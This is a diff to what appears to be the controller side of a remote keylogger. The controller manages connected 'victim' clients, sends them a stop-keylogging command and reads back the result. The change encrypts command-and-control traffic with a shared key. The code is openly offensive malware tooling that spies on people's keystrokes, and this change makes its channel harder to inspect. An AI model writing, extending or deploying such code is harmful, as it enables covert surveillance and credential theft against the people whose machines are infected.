@@ -4299,7 +4299,7 @@ def __perform_menu_item_1_helper(client_socket: socket.socket, client_dict: dict
         print(constants.KEYLOG_FILE_CHECK_ERROR.format(constants.KEYLOG_FILE_NAME, e))
 
 
-def perform_menu_item_2(client_dict: dict):
+def perform_menu_item_2(client_dict: dict, shared_secret: bytes):
     print(constants.STOP_KEYLOG_INITIAL_MSG)
 
     # a) CASE: Check if client list is empty
@@ -4312,7 +4312,7 @@ def perform_menu_item_2(client_dict: dict):
     if len(client_dict) == constants.CLIENT_LIST_INITIAL_SIZE:
         # Get client socket
         client_socket, (ip, port, status, status_2) = next(iter(client_dict.items()))
-        __perform_menu_item_2_helper(client_dict, client_socket, ip, port, status, status_2)
+        __perform_menu_item_2_helper(client_dict, client_socket, ip, port, status, status_2, shared_secret)
 
     # c) CASE: Handle for clients greater than 1
     elif len(client_dict) != constants.ZERO:
@@ -4324,7 +4324,8 @@ def perform_menu_item_2(client_dict: dict):
 
         if target_socket:
             __perform_menu_item_2_helper(client_dict, target_socket,
-                                         target_ip, target_port, status, status_2)
+                                         target_ip, target_port, status,
+                                         status_2, shared_secret)
         else:
             print(constants.TARGET_VICTIM_NOT_FOUND)
             print(constants.RETURN_MAIN_MENU_MSG)
@@ -4333,7 +4334,7 @@ def perform_menu_item_2(client_dict: dict):
 
 def __perform_menu_item_2_helper(client_dict: dict, client_socket: socket.socket,
                                  target_ip: str, target_port: int, status: bool,
-                                 status_2: bool):
+                                 status_2: bool, shared_key: bytes):
     # Check watching status
     if is_watching(status_2, target_ip, target_port, constants.WATCH_STATUS_TRUE_ERROR):
         print(constants.RETURN_MAIN_MENU_MSG)
@@ -4348,21 +4349,20 @@ def __perform_menu_item_2_helper(client_dict: dict, client_socket: socket.socket
         return None
     else:
         # Get signal from user to stop keylog on client/victim side
-        signal_to_stop = constants.ZERO
         print(constants.STOP_KEYLOGGER_PROMPT)
 
         while True:
             try:
                 signal_to_stop = int(input())
                 if signal_to_stop == constants.PERFORM_MENU_ITEM_TWO:
-                    client_socket.send(constants.STOP_KEYWORD.encode())
+                    client_socket.send(encrypt_string(constants.STOP_KEYWORD, shared_key).encode())
                     break
                 print(constants.INVALID_INPUT_STOP_KEYLOGGER)
             except ValueError as e:
                 print(constants.INVALID_INPUT_STOP_KEYLOGGER)
 
         # Await Results from keylogger on client/victim side (BLOCKING CALL)
-        result = client_socket.recv(constants.BYTE_LIMIT).decode().split("/")
+        result = decrypt_string(client_socket.recv(constants.BYTE_LIMIT).decode(), shared_key).split("/")
         result_status = result[0]
         result_msg = result[1]
 
